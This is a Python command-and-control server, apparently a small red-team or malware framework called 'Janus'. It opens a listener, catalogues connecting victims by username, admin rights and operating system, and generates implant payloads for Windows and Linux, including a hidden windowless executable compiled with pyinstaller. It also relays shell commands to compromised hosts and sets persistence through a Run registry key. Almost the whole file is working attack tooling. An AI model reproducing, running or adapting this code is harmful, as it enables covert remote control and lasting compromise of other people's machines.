import socket
import threading
import time
from datetime import datetime
from prettytable import PrettyTable
import random
import string
import os
import os.path
import shutil
import subprocess

def banner(): 
    print('   __     ______     __   __     __  __     ______             ')
    print('  /\ \   /\  __ \   /\ "-.\ \   /\ \/\ \   /\  ___\            ')
    print(' _\_\ \  \ \  __ \  \ \ \-.  \  \ \ \_\ \  \ \___  \           ') 
    print('/\_____\  \ \_\ \_\  \ \_\ "\_\  \ \_____\  \/\_____\          ')
    print('\/_____/   \/_/\/_/   \/_/ \/_/   \/_____/   \/_____/  by  rg\n')

#C2 Server Help
def helpfile():
    print ('\n')
    print ('Usage:\n')
    print ('LISTENER')
    print ('listener -n' + ' ' * 22 + 'Creates new socket based on input IP and Port\n')
    print ('PAYLOAD GENERATION')
    print ('winplant exe' + ' ' * 4 + 'Creates executable payload for Windows')
    print ('winplant py' + ' ' * 5 + 'Creates Python payload for Windows')
    print ('winplant py' + ' ' * 5 + 'Creates Python payload for Linux')
    print ('\nSESSIONS')  
    print ('sessions -l' + ' ' * 22 + 'Lists active sessions')
    print ('sessions -i [session number]' + ' ' * 5 + 'Connect to session')
    print ('\n')
                                                      
#Function to Handle Incoming Messages
def comm_in(targ_id):
     print('[+] Awaiting response...')
     response = targ_id.recv(1024).decode()
     return response

#Function to Handle Outgoing Messages
def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())

def target_comm(targ_id, targets, num):
    while True:
        message = input('Send Message > ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background' or message == 'bg':
            break
        if message == 'persist':
            payload_name = input('Enter the name of the payload to add to autorun: ')
            if targets[num][6] == 1:
                persist_command_1 = f'cmd.exe /c copy {payload_name} C:\\Users\\Public'
                targ_id.send(persist_command_1.encode())
                time.sleep(5)
                persist_command_2 = f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}'
                targ_id.send(persist_command_2.encode())
                print('[!] Run this command to clean up the registry: \n reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print(f'[!] {targ_id} has terminated the session.')
                targ_id.close()
                break
            print(response)

#Listener Handler Function
def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Server ready for client connection(s)...\n')
    sock.listen()
    t1 = threading.Thread(target=comm_handler)
    t1.start()

#Communication Handler Function
def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            username = remote_target.recv(1024).decode()
            admin = remote_target.recv(1024).decode()
            opsys = remote_target.recv(1024).decode()
            if 'Windows' in opsys:
                pay_val = 1
            else:
                pay_val = 2
            if admin == 1:
                admin_val = 'Yes'
            elif username == 'root':
                admin_val = 'Yes'
            else:
                admin_val = 'No'
            cur_time = time.strftime("%H:%M:%S", time.localtime())
            date = datetime.now()
            time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
            host_name = socket.gethostbyaddr(remote_ip[0])
            if host_name is not None:
                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys, pay_val])
                print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
            else:
                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys, pay_val])
                print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
        except:
            pass

#Creates Python payload for Windows systems. Called with winplant py.
def winplant():
    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = (f'{randomizer}.py')
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[!] winplant.py file not found.')   
    with open(file_name) as file:
        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
    with open (file_name, 'w') as file:
        file.write(new_host)
        file.close()
    with open(file_name) as file:
        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
    with open (file_name, 'w') as file:
        file.write(new_port)
        file.close()
    if os.path.exists(f'{file_name}'):
        print(f'{file_name} saved to current directory.')
    else:
        print('[!] An unexpected error occured during the build.')

#Creates Python payload for linux systems. Called with linplant py.
def linplant():
    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = (f'{randomizer}.py')
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\linplant.py'):
        shutil.copy('linplant.py', file_name)
    else:
        print('[!] linplant.py file not found.')  
    with open(file_name) as file:
        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
    with open (file_name, 'w') as file:
        file.write(new_host)
        file.close()
    with open(file_name) as file:
        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
    with open (file_name, 'w') as file:
        file.write(new_port)
        file.close()
    if os.path.exists(f'{file_name}'):
        print(f'{file_name} saved to current directory.')
    else:
        print('[!] An unexpected error occured during the build.')

#Creates an executable payload for Windows systems only. Called with winplant exe.
def exeplant():
    randomizer = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = (f'{randomizer}.py')
    exe_file = (f'{randomizer}.exe')
    check_cwd = os.getcwd()
    if os.path.exists(f'{check_cwd}\\winplant.py'):
        shutil.copy('winplant.py', file_name)
    else:
        print('[!] winplant.py file not found.')   
    with open(file_name) as file:
        new_host = file.read().replace('INPUT_IP_HERE', host_ip)
    with open (file_name, 'w') as file:
        file.write(new_host)
        file.close()
    with open(file_name) as file:
        new_port = file.read().replace("'INPUT_PORT_HERE'", host_port)
    with open (file_name, 'w') as file:
        file.write(new_port)
        file.close()
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    print('Cleaning up build files...')
    os.remove(f'{randomizer}.spec')
    shutil.rmtree('build')
    if os.path.exists(f'{check_cwd}\\{exe_file}'):
        print(f'Build successfully compiled. {exe_file} saved to current directory.')
    else:
        print('[!] An unexpected error occured during the build.')

#Main
if __name__ == '__main__':
    targets = []
    listener_counter = 0
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        try:
            command = input('Command > ')
            if command == 'help' or command == '-h':
                helpfile()
            if command == 'listener -n':
                host_ip = input('Enter the IP to list on: ')
                host_port  = input('Enter the port to listen on: ')
                listener_handler()
                listener_counter += 1
            if command == 'winplant py':
                if listener_counter > 0:
                    winplant()
                else:
                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
            if command == 'linplant py':
                if listener_counter > 0:
                    linplant()
                else:
                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
            if command == 'winplant exe':
                if listener_counter > 0:
                    exeplant()
                else:
                    print('[!] You cannot generate a payload without an active listener. Use command -h for help.')
            if command.split(" ")[0] == 'sessions': 
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    myTable = PrettyTable()
                    myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Session Start Time']
                    myTable.padding_width = 3
                    for target in targets:
                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
                        session_counter += 1
                    print (myTable)
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id, targets, num)
        except KeyboardInterrupt:
            print('\n[!] Keyboard interrupt issued.')
            kill_flag = 1
            sock.close()
            break